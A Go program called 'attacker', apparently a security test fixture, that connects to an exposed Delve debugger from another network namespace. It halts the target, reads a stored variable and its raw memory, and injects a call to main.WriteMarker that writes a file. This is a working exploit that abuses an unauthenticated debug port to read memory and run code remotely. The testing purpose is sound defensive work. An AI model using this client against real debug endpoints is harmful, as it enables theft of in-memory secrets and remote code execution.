// Command attacker is a Delve JSON-RPC client. It is built against the
// Delve module version shipped in the debug base image and run from a
// network namespace other than the debuggee's.
package main

import (
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/go-delve/delve/service/api"
	"github.com/go-delve/delve/service/rpc2"
)

type result struct {
	Connected    bool   `json:"connected"`
	UID          int    `json:"uid"`
	DialError    string `json:"dialError,omitempty"`
	SecondClient bool   `json:"secondClient"`
	SecondEval   string `json:"secondEval,omitempty"`
	EvalValue    string `json:"evalValue,omitempty"`
	Examined     string `json:"examined,omitempty"`
	EvalError    string `json:"evalError,omitempty"`
	ExamineError string `json:"examineError,omitempty"`
	CallError    string `json:"callError,omitempty"`
}

func main() {
	addr := flag.String("addr", "", "debugger listen address")
	side := flag.String("side", "", "path the injected call should create")
	out := flag.String("out", "", "result json path")
	flag.Parse()

	res := result{UID: os.Getuid()}
	defer func() {
		b, err := json.Marshal(res)
		if err != nil {
			return
		}
		_ = os.WriteFile(*out, b, 0o644)
	}()

	conn, err := net.DialTimeout("tcp", *addr, 5*time.Second)
	if err != nil {
		res.DialError = err.Error()
		return
	}
	res.Connected = true
	client := rpc2.NewClientFromConn(conn)
	defer client.Disconnect(false)

	// A debuggee that has not been continued is already stopped. Halt is
	// what stops one that was started with --continue.
	_, _ = client.Halt()
	id := selectRunning(client)
	if id == 0 {
		resumeAndHalt(client, *addr)
		id = selectRunning(client)
	}
	if id == 0 {
		res.CallError = "no running goroutine"
		return
	}
	if _, err := client.SwitchGoroutine(id); err != nil {
		res.EvalError = "switch: " + err.Error()
		return
	}

	if conn2, err2 := net.DialTimeout("tcp", *addr, 5*time.Second); err2 == nil {
		other := rpc2.NewClientFromConn(conn2)
		v, ev := other.EvalVariable(api.EvalScope{GoroutineID: id}, "main.StoredTrace", api.LoadConfig{MaxStringLen: 128})
		if ev == nil && v != nil {
			res.SecondClient = true
			res.SecondEval = v.Value
		}
		_ = other.Disconnect(false)
	}

	v, err := client.EvalVariable(api.EvalScope{GoroutineID: id}, "main.StoredTrace", api.LoadConfig{MaxStringLen: 128})
	if err != nil {
		res.EvalError = err.Error()
	} else if v != nil {
		res.EvalValue = v.Value
		header, _, herr := client.ExamineMemory(v.Addr, 16)
		if herr != nil {
			res.ExamineError = herr.Error()
		} else if len(header) >= 8 {
			ptr := binary.NativeEndian.Uint64(header[:8])
			mem, _, merr := client.ExamineMemory(ptr, int(v.Len))
			if merr != nil {
				res.ExamineError = merr.Error()
			} else {
				res.Examined = string(mem)
			}
		}
	}

	client.SetReturnValuesLoadConfig(&api.LoadConfig{MaxStringLen: 64})
	if _, err := client.Call(id, fmt.Sprintf("main.WriteMarker(%q)", *side), false); err != nil {
		res.CallError = err.Error()
	}
}

// resumeAndHalt continues a debuggee that is stopped at startup, then
// halts it once a user goroutine is scheduled. The remote-storage debug
// image omits --continue, so this is how a client reaches a running goroutine.
func resumeAndHalt(client *rpc2.RPCClient, addr string) {
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return
	}
	resumer := rpc2.NewClientFromConn(conn)
	resumer.SetReturnValuesLoadConfig(&api.LoadConfig{MaxStringLen: 64})
	states := resumer.Continue()
	time.Sleep(500 * time.Millisecond)
	_, _ = client.Halt()
	select {
	case <-states:
	case <-time.After(2 * time.Second):
	}
	_ = resumer.Disconnect(false)
}

func selectRunning(client *rpc2.RPCClient) int64 {
	gs, _, err := client.ListGoroutines(0, 100)
	if err != nil {
		return 0
	}
	for _, g := range gs {
		name := ""
		if g.UserCurrentLoc.Function != nil {
			name = g.UserCurrentLoc.Function.Name()
		}
		if strings.Contains(name, "main.main") && g.ThreadID != 0 {
			return g.ID
		}
	}
	return 0
}
